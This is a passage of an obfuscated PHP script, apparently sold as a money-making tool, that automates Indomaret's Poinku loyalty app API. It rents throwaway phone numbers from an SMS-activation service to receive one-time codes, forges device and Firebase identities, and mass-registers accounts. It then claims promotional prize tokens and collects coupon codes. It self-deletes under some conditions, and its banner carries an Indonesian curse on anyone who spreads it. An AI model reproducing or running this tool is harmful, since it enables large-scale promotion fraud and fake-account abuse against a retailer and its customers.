                                                                        echo @ZM6iC("red", "[10] {$J2jGQ} \n\t> {$L9Nzh} \n\n");
                                                                        echo @zm6Ic("purple", "[11] {$mF_0D} \n\t> {$GTMYQ} \n\n");
                                                                        echo @zm6iC("green", "[12] {$LNAso} \n\t> {$f2A4u} \n\n");
                                                                        echo @zm6Ic("yellow", "[13] {$t4wQX} \n\t> {$Q6vWf} \n\n");
                                                                        echo @ZM6IC("nevy", "[14] {$S02nx} \n\t> {$Q8u1Y} \n\n");
                                                                        echo @zm6ic("purple", "[15] {$ucJzj} \n\t> {$Ex3sI} \n\n");
                                                                        echo @zm6iC("green", "[16] {$PKr5B} \n\t> {$kGhP3} \n\n");
                                                                        echo @ZM6iC("nevy", "[17] {$uU2QF} \n\t> {$e52KH} \n\n");
                                                                        echo @zm6Ic("nevy", "[18] {$ipfVm} \n\t> {$gwQ0n} \n\n");
                                                                        $jTEU0++;
                                                                        goto CqA3L;
                                                                    }
                                                                    $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                    $u35jw = count($m0f8X) - 1;
                                                                    $lPULW = $m0f8X;
                                                                    $wZnHP = $lPULW[$jTEU0];
                                                                    $oNl8L = explode("\n", @file_get_contents("GRATIS Indomie Mi Goreng!.txt"));
                                                                    $u35jw = count($oNl8L) - 1;
                                                                    $E_1ED = $oNl8L;
                                                                    $mQ1PX = $E_1ED[$jTEU0];
                                                                    echo "\n";
                                                                    $zcN5u = XOzb4(array("|"), $wZnHP)[0];
                                                                    $vzRG5 = xoZB4(array("|"), $mQ1PX)[0];
                                                                    $wlJRC = XoZb4(array("|"), $wZnHP)[1];
                                                                    $U0YgX = str_replace("\r", '', $zcN5u);
                                                                    $zn5zd = $U0YgX;
                                                                    $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                    $aY0el = $v1ZMX;
                                                                    $sONlZ = str_replace("\r", '', $rERzL);
                                                                    $earOL = $sONlZ;
                                                                    $w5ulg = str_replace("\r", '', $TvVlh);
                                                                    $GOXkU = $w5ulg;
                                                                    $obc_G = str_replace("\r", '', $wlJRC);
                                                                    $mlMLt = $obc_G;
                                                                    $qeP83 = str_replace("\r", '', $vzRG5);
                                                                    $QG8my = $qeP83;
                                                                    echo @ZM6iC("nevy", "Akun Ke\t\t: ");
                                                                    echo $jTEU0;
                                                                    echo "\n";
                                                                    $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                    $Ap1KM = json_decode($Jk9cx, true);
                                                                    $M1ADy = @$Ap1KM["data"]["id"];
                                                                    $p4iky = @$Ap1KM["data"]["memberId"];
                                                                    $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                    echo "\n";
                                                                    echo @Zm6ic("green", "Nomor HP Anda  : ");
                                                                    echo $BcbF3;
                                                                    echo "\n";
                                                                    echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $QG8my . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                                    shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $QG8my . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                                    echo "\n";
                                                                    echo @Zm6iC("nevy", "Tekan Enter Untuk Lanjut : ");
                                                                    $C2XmN = trim(fgets(STDIN));
                                                                    echo "\n";
                                                                    $jTEU0++;
                                                                    goto LRKWE;
                                                                }
                                                                $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                $u35jw = count($m0f8X) - 1;
                                                                $lPULW = $m0f8X;
                                                                $wZnHP = $lPULW[$jTEU0];
                                                                echo "\n";
                                                                $zcN5u = Xozb4(array("|"), $wZnHP)[0];
                                                                $wlJRC = XoZB4(array("|"), $wZnHP)[1];
                                                                $U0YgX = str_replace("\r", '', $zcN5u);
                                                                $zn5zd = $U0YgX;
                                                                $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                $aY0el = $v1ZMX;
                                                                $sONlZ = str_replace("\r", '', $rERzL);
                                                                $earOL = $sONlZ;
                                                                $w5ulg = str_replace("\r", '', $TvVlh);
                                                                $GOXkU = $w5ulg;
                                                                $obc_G = str_replace("\r", '', $wlJRC);
                                                                $mlMLt = $obc_G;
                                                                echo @zm6iC("nevy", "Akun Ke\t\t: ");
                                                                echo $jTEU0;
                                                                $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                $Ap1KM = json_decode($Jk9cx, true);
                                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                                $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                echo "\n";
                                                                echo @zm6ic("green", "Nomor HP Anda  : ");
                                                                echo $BcbF3;
                                                                echo "\n";
                                                                if (!($fUekS == '')) {
                                                                    $N0XGD = G8pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me", $aY0el, $GOXkU, $mlMLt);
                                                                    $Ap1KM = json_decode($N0XGD, true);
                                                                    $XDyMm = @$Ap1KM["data"]["balance"];
                                                                    echo "\n";
                                                                    echo @ZM6IC("yellow", "Poin Akun Anda : ");
                                                                    echo @zm6ic("nevy", $XDyMm);
                                                                    echo "\n";
                                                                    $jTEU0++;
                                                                    goto GGXBW;
                                                                }
                                                                echo "\n";
                                                                echo @Zm6iC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                @unlink("poinhp.php");
                                                                @unlink("poinhp.php");
                                                                echo "\n";
                                                                die;
                                                            }
                                                            $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                            $efQM2 = count($QRhbE) - 1;
                                                            $zvt88 = $QRhbE;
                                                            $tqWr2 = $zvt88[$jTEU0];
                                                            echo "\n";
                                                            $zcN5u = xOzB4(array("|"), $tqWr2)[0];
                                                            $wPFxB = XoZb4(array("|"), $tqWr2)[1];
                                                            $rERzL = xozb4(array("|", "\r"), $tqWr2)[2];
                                                            $TvVlh = XozB4(array("|", "\r"), $tqWr2)[3];
                                                            $U0YgX = str_replace("\r", '', $zcN5u);
                                                            $zn5zd = $U0YgX;
                                                            $v1ZMX = str_replace("\r", '', $wPFxB);
                                                            $aY0el = $v1ZMX;
                                                            $sONlZ = str_replace("\r", '', $rERzL);
                                                            $earOL = $sONlZ;
                                                            $w5ulg = str_replace("\r", '', $TvVlh);
                                                            $GOXkU = $w5ulg;
                                                            echo @zM6iC("nevy", "Akun Ke : ");
                                                            echo $jTEU0;
                                                            $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                            $phWC6 = G66lT("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist", $wDisp, $aY0el);
                                                            $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\",\"pinCode\":\"" . $earOL . "\"}";
                                                            $SpzvW = g66lt("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/validate-pin", $wDisp, $aY0el);
                                                            $owfHy = json_decode($SpzvW, true);
                                                            $ABmxY = @$owfHy["message"];
                                                            $mlMLt = @$owfHy["data"]["access_token"];
                                                            echo "\n";
                                                            echo @ZM6IC("yellow", "Pesan  : ");
                                                            echo @ZM6Ic("nevy", $ABmxY);
                                                            echo "\n";
                                                            if (!($ABmxY == "Success")) {
                                                                goto Zfg2N;
                                                            }
                                                            lqjr6("mytoken", $zn5zd, $mlMLt);
                                                            Zfg2N:
                                                            $jTEU0++;
                                                            goto ODvt2;
                                                        }
                                                        goto Q7LGl;
                                                    }
                                                    $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                    $u35jw = count($m0f8X) - 1;
                                                    $lPULW = $m0f8X;
                                                    $wZnHP = $lPULW[$jTEU0];
                                                    echo "\n";
                                                    $zcN5u = xOzB4(array("|"), $wZnHP)[0];
                                                    $wlJRC = xOZB4(array("|"), $wZnHP)[1];
                                                    $U0YgX = str_replace("\r", '', $zcN5u);
                                                    $zn5zd = $U0YgX;
                                                    $v1ZMX = str_replace("\r", '', $wPFxB);
                                                    $aY0el = $v1ZMX;
                                                    $sONlZ = str_replace("\r", '', $rERzL);
                                                    $earOL = $sONlZ;
                                                    $w5ulg = str_replace("\r", '', $TvVlh);
                                                    $GOXkU = $w5ulg;
                                                    $obc_G = str_replace("\r", '', $wlJRC);
                                                    $mlMLt = $obc_G;
                                                    echo @zm6IC("nevy", "Akun Ke\t\t: ");
                                                    echo $jTEU0;
                                                    echo "\n";
                                                    $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                    $Ap1KM = json_decode($Jk9cx, true);
                                                    $M1ADy = @$Ap1KM["data"]["id"];
                                                    $p4iky = @$Ap1KM["data"]["memberId"];
                                                    $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                    echo "\n";
                                                    echo @Zm6Ic("green", "Nomor HP Anda  : ");
                                                    echo $BcbF3;
                                                    echo "\n";
                                                    if (!($fUekS == '')) {
                                                        $xT15V = G8pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile", $aY0el, $GOXkU, $mlMLt);
                                                        $Ap1KM = json_decode($xT15V, true);
                                                        $xT15V = g8pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/", $aY0el, $GOXkU, $mlMLt);
                                                        $Ap1KM = json_decode($xT15V, true);
                                                        $N0XGD = g8PF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me", $aY0el, $GOXkU, $mlMLt);
                                                        $Ap1KM = json_decode($N0XGD, true);
                                                        $XDyMm = @$Ap1KM["data"]["balance"];
                                                        echo "\n";
                                                        echo @zm6Ic("yellow", "Poin Akun Anda : ");
                                                        echo @Zm6iC("nevy", $XDyMm);
                                                        echo "\n";
                                                        $xT15V = g8pf2("https://edtsapp.indomaretpoinku.com/%2Floyalty%2Fapix-1502-api%2Fmobile%2Fcoins%2Fprizes%2FGOFRESH2022%2Fme", $aY0el, $GOXkU, $mlMLt);
                                                        $Ap1KM = json_decode($xT15V, true);
                                                        $XDyMm = @$Ap1KM["data"]["balance"];
                                                        if ($XDyMm == "1") {
                                                            echo @zm6Ic("green", "Ada Ayam... Yuk Pecahin !!");
                                                            echo "\n";
                                                            goto q9_1d;
                                                        }
                                                        if (!($XDyMm == "0")) {
                                                            if (!($fUekS == '')) {
                                                                q9_1d:
                                                                $wDisp = '';
                                                                $ofEkP = cWalZ("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/coins/prizes/GOFRESH2022/tokens/claim/single", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                $Ap1KM = json_decode($ofEkP, true);
                                                                $YXsOG = @$Ap1KM["message"];
                                                                $ZNU2M = @$Ap1KM["data"]["rewards"][0]["item"][0]["name"];
                                                                $KOeAA = @$Ap1KM["data"]["rewards"][0]["item"][0]["couponMasterId"];
                                                                echo "\n";
                                                                echo @ZM6ic("yellow", "Status Pecahin Ayam : ");
                                                                echo @Zm6IC("nevy", $YXsOG);
                                                                echo "\n";
                                                                echo @ZM6IC("yellow", "Nama Kuponnya\t   : ");
                                                                echo @zM6ic("nevy", $ZNU2M);
                                                                echo "\n";
                                                                if (!($ZNU2M == '')) {
                                                                    $upOL9 = G8Pf2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupon-detail/" . $KOeAA, $aY0el, $GOXkU, $mlMLt);
                                                                    $Ap1KM = json_decode($upOL9, true);
                                                                    $YXsOG = @$Ap1KM["message"];
                                                                    $ZNU2M = @$Ap1KM["data"]["couponName"];
                                                                    $WtCiL = @$Ap1KM["data"]["couponCode"];
                                                                    $LgiFv = @$Ap1KM["data"]["information"];
                                                                    echo "\n";
                                                                    echo @zM6iC("yellow", "Status Cek Kupon : ");
                                                                    echo @zM6Ic("nevy", $YXsOG);
                                                                    echo "\n";
                                                                    echo @zM6Ic("yellow", "Nama Kuponnya\t: ");
                                                                    echo @zm6IC("nevy", $ZNU2M);
                                                                    echo "\n";
                                                                    echo @Zm6ic("yellow", "Kode Kuponnya\t: ");
                                                                    echo @zm6ic("nevy", $WtCiL);
                                                                    echo "\n";
                                                                    echo @ZM6Ic("red", "Notice : ");
                                                                    echo @zm6iC("green", $LgiFv);
                                                                    echo "\n";
                                                                    $upOL9 = G8pF2("https://edtsapp.indomaretpoinku.com/coupon/apix-1502-api/mobile/coupons?unpaged=true", $aY0el, $GOXkU, $mlMLt);
                                                                    $owfHy = json_decode($upOL9, true);
                                                                    $D2zwh = "0";
                                                                    $ogbF4 = "30";
                                                                    $D2zwh;
                                                                    EHIPK:
                                                                    if (!($D2zwh < $ogbF4)) {
                                                                        goto y1Iam;
                                                                    }
                                                                    $ZNU2M = @$owfHy["data"]["content"][$D2zwh]["couponName"];
                                                                    $SR3ui = @$owfHy["data"]["content"][$D2zwh]["couponCode"];
                                                                    if (!($ZNU2M == '')) {
                                                                        echo "\n";
                                                                        echo @ZM6IC("yellow", "Nama Kuponnya\t: ");
                                                                        echo @ZM6Ic("nevy", $ZNU2M);
                                                                        echo "\n";
                                                                        echo @zm6IC("yellow", "Kode Kuponnya\t: ");
                                                                        echo @Zm6iC("nevy", $SR3ui);
                                                                        echo "\n";
                                                                        blHDG($ZNU2M . ".txt", $SR3ui);
                                                                        $D2zwh++;
                                                                        goto EHIPK;
                                                                    }
                                                                    y1Iam:
                                                                    if (!($fUekS == '')) {
                                                                        goto lVk3T;
                                                                    }
                                                                    echo "\n";
                                                                    echo @Zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                    @unlink("poinhp.php");
                                                                    @unlink("poinhp.php");
                                                                    echo "\n";
                                                                    die;
                                                                }
                                                                goto q9_1d;
                                                            }
                                                            echo "\n";
                                                            echo @Zm6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                            @unlink("poinhp.php");
                                                            @unlink("poinhp.php");
                                                            echo "\n";
                                                            die;
                                                        }
                                                        echo @zM6ic("red", "Yah... Ayam Nya Ga Ada , Akan Di Cek Kembali...");
                                                        echo "\n";
                                                        lVk3T:
                                                        $jTEU0++;
                                                        goto MN2hd;
                                                    }
                                                    echo "\n";
                                                    echo @zM6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                    @unlink("poinhp.php");
                                                    @unlink("poinhp.php");
                                                    echo "\n";
                                                    die;
                                                }
                                                $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                $u35jw = count($m0f8X) - 1;
                                                $lPULW = $m0f8X;
                                                $wZnHP = $lPULW[$jTEU0];
                                                echo "\n";
                                                $zcN5u = Xozb4(array("|"), $wZnHP)[0];
                                                $wlJRC = xOZB4(array("|"), $wZnHP)[1];
                                                $U0YgX = str_replace("\r", '', $zcN5u);
                                                $zn5zd = $U0YgX;
                                                $v1ZMX = str_replace("\r", '', $wPFxB);
                                                $aY0el = $v1ZMX;
                                                $sONlZ = str_replace("\r", '', $rERzL);
                                                $earOL = $sONlZ;
                                                $w5ulg = str_replace("\r", '', $TvVlh);
                                                $GOXkU = $w5ulg;
                                                $obc_G = str_replace("\r", '', $wlJRC);
                                                $mlMLt = $obc_G;
                                                echo @zm6iC("nevy", "Akun Ke\t\t: ");
                                                echo $jTEU0;
                                                echo "\n";
                                                $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                $Ap1KM = json_decode($Jk9cx, true);
                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                echo "\n";
                                                echo @zM6Ic("green", "Nomor HP Anda  : ");
                                                echo $BcbF3;
                                                echo "\n";
                                                $Jk9cx = g8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                $Ap1KM = json_decode($Jk9cx, true);
                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                echo "\n";
                                                echo @ZM6IC("yellow", "SCAN BARCODE INI AGAR KASIR LEBIH MUDAH..");
                                                $wDisp = '';
                                                $ofEkP = zFEbK("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me/protections/enable", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                $Jk9cx = G8pF2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/reminders/me", $aY0el, $GOXkU, $mlMLt);
                                                echo shell_exec("xdg-open \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                shell_exec("start chrome \"https://barcode.tec-it.com/barcode.ashx?data=\"" . $p4iky . "\"&code=Code128&multiplebarcodes=false&translate-esc=true&unit=Fit&dpi=96&imagetype=Gif&rotation=0&color=%23000000&bgcolor=%23ffffff&codepage=Default&qunit=Mm&quiet=10&hidehrt=False\"");
                                                echo "\n";
                                                echo @zm6ic("nevy", "Tekan Enter Untuk Lanjut : ");
                                                $C2XmN = trim(fgets(STDIN));
                                                echo "\n";
                                                $jTEU0++;
                                                goto Pn_38;
                                            }
                                            echo @zM6Ic("nevy", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                            date_default_timezone_set("Asia/Jakarta");
                                            $wd9cN = date("d-m-Y | H:i:s");
                                            echo @zm6iC("nevy", $wd9cN);
                                            echo @zm6IC("green", "  | WA 082176358295 \n");
                                            echo @Zm6Ic("yellow", "\t\tBuild By FERDY RAMADHAN\n");
                                            echo @Zm6iC("yellow", "\t\tYANG NYEBARIN SCRIPT INI \n");
                                            echo @ZM6iC("yellow", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                            echo @Zm6Ic("yellow", "\t\t\t   AAMIIN ");
                                            echo @zM6Ic("nevy", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                            echo @ZM6iC("red", "Notice.. !! : \n");
                                            echo @Zm6Ic("yellow", " - Harap Teliti Dalam Menggunakan Script\n");
                                            echo @zM6IC("yellow", " - Dilarang Keras Memberi Dan Menyebar Script Ini\n");
                                            echo @ZM6IC("yellow", " - Segala Bentuk Kerugian Anda Bukan Tanggung Jawab Kami\n");
                                            echo @Zm6iC("yellow", " - Semoga Cuan ^^ Terima Kasih Telah Membeli Script Ini\n");
                                            echo @ZM6Ic("red", "=====================================================\n");
                                            echo @zm6IC("yellow", "Register + Set Pin OTOMATIS\n");
                                            $earOL = "112233";
                                            $rVPVc = @file_get_contents("sigeo takeda");
                                            if (!($rVPVc == '')) {
                                                goto r9C2_;
                                            }
                                            @unlink("poin");
                                            echo "\n";
                                            echo @ZM6ic("nevy", "Masukkan API Key Mu  : ");
                                            $rVPVc = trim(fgets(STDIN));
                                            r1qLs("sigeo takeda", $rVPVc);
                                            r9C2_:
                                            QRHsK:
                                            echo "\n";
                                            $xp_1p = "indo.txt";
                                            if (!unlink($xp_1p)) {
                                                echo "Error deleting indo.txt  ";
                                                goto LLunD;
                                            }
                                            echo "Deleted {$xp_1p}  ";
                                            LLunD:
                                            echo "\n";
                                            $xp_1p = "klik.txt";
                                            if (!unlink($xp_1p)) {
                                                echo "Error deleting klik.txt  ";
                                                goto NlZns;
                                            }
                                            echo "Deleted {$xp_1p}  ";
                                            NlZns:
                                            Gq4tD:
                                            echo "\n";
                                            $Ti1xH = z82Db("https://sms-activate.ru/stubs/handler_api.php?api_key=" . $rVPVc . "&action=getBalance");
                                            echo @Zm6IC("yellow", $Ti1xH);
                                            echo "\n";
                                            $wDisp = '';
                                            $jze6k = Ww9VQ("https://sms-activate.ru/stubs/handler_api.php?owner=5&country=6&api_key=" . $rVPVc . "&service=ju&forward=0&action=getNumber&sessionId=86f4bf31c145b15d073d5bd58bc9120e&operator=any", $wDisp);
                                            $jU3Co = XOZb4(array(":"), $jze6k)[1];
                                            $O8Mmj = xozb4(array(":"), $jze6k)[2];
                                            echo @ZM6IC("green", "Nomor   : ");
                                            $zn5zd = substr_replace($O8Mmj, "0", 0, 2);
                                            echo @Zm6iC("red", $zn5zd);
                                            echo "\n";
                                            $nb9cm = round(microtime(true) * 1000);
                                            $sOOnY = Fq6w0();
                                            $jlHkA = str_replace("-", '', $sOOnY);
                                            $KbHJf = rand(1000000, 9999999);
                                            $gYG6P = rand(1000, 9999);
                                            $ZdrCv = rand(10, 99);
                                            $aY0el = $jlHkA;
                                            $qq5tL = "2" . $gYG6P . "hg5454d21vc";
                                            $GOXkU = "Xiaomi Redmi 5 Plus";
                                            $cod3H = fq6w0();
                                            $kCT0W = str_replace("-", '', $cod3H);
                                            $odGGi = $kCT0W . "mbLQpe";
                                            $MXjqh = xWl4l();
                                            $wDisp = "{\"fid\":\"" . $odGGi . "\",\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"authVersion\":\"FIS_v2\",\"sdkVersion\":\"a:17.0.0\"}";
                                            $a7K8a = jLw7P("https://firebaseinstallations.googleapis.com/v1/projects/idm-corp-prd/installations", $wDisp);
                                            $H1g60 = json_decode($a7K8a, true);
                                            $WYrgv = @$H1g60["fid"];
                                            $YYbml = @$H1g60["authToken"]["token"];
                                            $yPeiy = @$H1g60["refreshToken"];
                                            $Jk9cx = E6Tpn("https://firebase-settings.crashlytics.com/spi/v2/platforms/android/gmp/1:998816605328:android:" . $aY0el . "/settings?instance=a291cbe808f666683ac167ea58393c709528e4f6&build_version=104&display_version=3.13.0&source=4", $aY0el);
                                            $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"activity_details\":\"resume_app\",\"event_name\":\"app_activity\",\"event_timestamp\":" . $nb9cm . "},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                            $m5BZY = GGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                            if (!($fUekS == '')) {
                                                $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_name\":\"page_view\",\"event_timestamp\":" . $nb9cm . ",\"page_name\":\"splash\",\"page_urlpath\":\"\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                $m5BZY = gGgR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                $wDisp = "{\"appInstanceId\":\"" . $WYrgv . "\",\"appVersion\":\"3.13.0\",\"countryCode\":\"ID\",\"analyticsUserProperties\":{},\"appId\":\"1:998816605328:android:" . $aY0el . "\",\"platformVersion\":\"28\",\"timeZone\":\"Asia\\/Jakarta\",\"sdkVersion\":\"21.0.1\",\"packageName\":\"mypoin.indomaret.android\",\"appInstanceIdToken\":\"" . $YYbml . "\",\"languageCode\":\"id-ID\",\"appBuild\":\"104\"}";
                                                $a7K8a = AUJhZ("https://firebaseremoteconfig.googleapis.com/v1/projects/998816605328/namespaces/firebase:fetch", $wDisp, $YYbml);
                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                $hwqq9 = tHHFS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/check-device", $wDisp, $aY0el, $GOXkU);
                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                $PQD51 = THhFS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/pin/is-pin-exist-by-phone-number", $wDisp, $aY0el, $GOXkU);
                                                if (!($fUekS == '')) {
                                                    $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                    $yI7qh = THHFS("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-sms", $wDisp, $aY0el, $GOXkU);
                                                    $H1g60 = json_decode($yI7qh, true);
                                                    $ABmxY = @$H1g60["message"];
                                                    $D18xv = @$H1g60["data"]["id"];
                                                    echo @zM6iC("yellow", "Pesan : ");
                                                    echo @ZM6Ic("nevy", $ABmxY);
                                                    echo "\n";
                                                    echo @zm6IC("yellow", "ID nya: ");
                                                    echo @ZM6iC("nevy", $D18xv);
                                                    echo "\n";
                                                    $wDisp = "{\"data\":[{\"application\":{\"app_version\":\"3.13.0\",\"device_class\":\"Phone\",\"device_family\":\"Xiaomi Redmi 5 Plus\",\"device_id\":\"" . $aY0el . "\",\"os_name\":\"Android P\",\"os_version\":\"Android 9\"},\"core\":{\"event_label\":\"login\",\"event_name\":\"event_submission\",\"event_status\":\"success\",\"event_timestamp\":" . $nb9cm . "},\"marketing\":{\"utm_raw\":\"utm_source=google-play&utm_medium=organic\"},\"user\":{\"session_id\":\"" . $MXjqh . "\",\"user_ip_address\":\"127.0.0.1\"}}]}";
                                                    $m5BZY = ggGR_("https://asia-southeast2-idm-corp-prd.cloudfunctions.net/idmapps_tracker_gateway", $wDisp);
                                                    $nb9cm = round(microtime(true) * 1000);
                                                    $OtngW = $eqo_P;
                                                    if (!($fUekS == '')) {
                                                        echo "\n";
                                                        echo @zM6iC("nevy", "OTP\t : ");
                                                        $yy9BI = "0";
                                                        $DxrJr = "11";
                                                        $yy9BI;
                                                        hLVkj:
                                                        if (!($yy9BI < $DxrJr)) {
                                                            echo "\n";
                                                            echo @ZM6iC("red", "Gagal, Mengambil Ulang Nomor...");
                                                            echo "\n";
                                                            goto Gq4tD;
                                                        }
                                                        $Ia9Ix = Z82DB("https://sms-activate.ru/stubs/handler_api.php?owner=5&api_key=" . $rVPVc . "&action=getStatus&market_id=1&sessionId=86f4bf31c145b15d073d5bd58bc9120e&id=" . $jU3Co);
                                                        $f5jPx = json_decode($Ia9Ix, true);
                                                        if ($Ia9Ix == "STATUS_WAIT_CODE") {
                                                            echo ">";
                                                            sleep(10);
                                                            vsi0y:
                                                            $yy9BI++;
                                                            goto hLVkj;
                                                        }
                                                        $hdCXp = xOzB4(array(":"), $Ia9Ix)[1];
                                                        echo @zM6IC("yellow", $hdCXp);
                                                        echo "\n";
                                                        $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"otp\":\"" . $hdCXp . "\",\"deviceId\":\"" . $aY0el . "\"}";
                                                        $o0WQD = thHfs("https://edtsapp.indomaretpoinku.com/login/apix-1502-api/open/login-verification-sms", $wDisp, $aY0el, $GOXkU);
                                                        $owfHy = json_decode($o0WQD, true);
                                                        $ABmxY = @$owfHy["message"];
                                                        $mlMLt = @$owfHy["data"]["access_token"];
                                                        echo "\n";
                                                        echo @zM6Ic("yellow", "Pesan\t\t\t  : ");
                                                        echo @zM6ic("nevy", $ABmxY);
                                                        echo "\n";
                                                        if (!($ABmxY == "Kode Verifikasi yang kamu masukan salah.")) {
                                                            if (!($fUekS == '')) {
                                                                $Jk9cx = g8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/get-data-customer", $aY0el, $GOXkU, $mlMLt);
                                                                $nPb0z = json_decode($Jk9cx, true);
                                                                $ABmxY = @$nPb0z["message"];
                                                                $kp_uF = @$nPb0z["data"]["isNewRegister"];
                                                                $R_bYC = @$nPb0z["data"]["id"];
                                                                $p4iky = @$nPb0z["data"]["memberId"];
                                                                echo @zm6Ic("yellow", "Pesan\t\t\t  : ");
                                                                echo @Zm6Ic("nevy", $ABmxY);
                                                                echo "\n";
                                                                echo @zm6ic("yellow", "Apakah Member Baru : ");
                                                                echo @Zm6Ic("nevy", $kp_uF);
                                                                echo "\n";
                                                                $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/is-whatsapp-verified", $aY0el, $GOXkU, $mlMLt);
                                                                $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/ms-homepage-layout/get-all-homepage-layout", $aY0el, $GOXkU, $mlMLt);
                                                                $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/configuration/apix-1502-api/mobile/skip-module/tr-skip-module", $aY0el, $GOXkU, $mlMLt);
                                                                $wDisp = '';
                                                                $k1y0B = G1wXT("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/remove-isaku-token", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                $wDisp = "{\"phoneNumber\":\"" . $zn5zd . "\",\"deviceId\":\"" . $aY0el . "\"}";
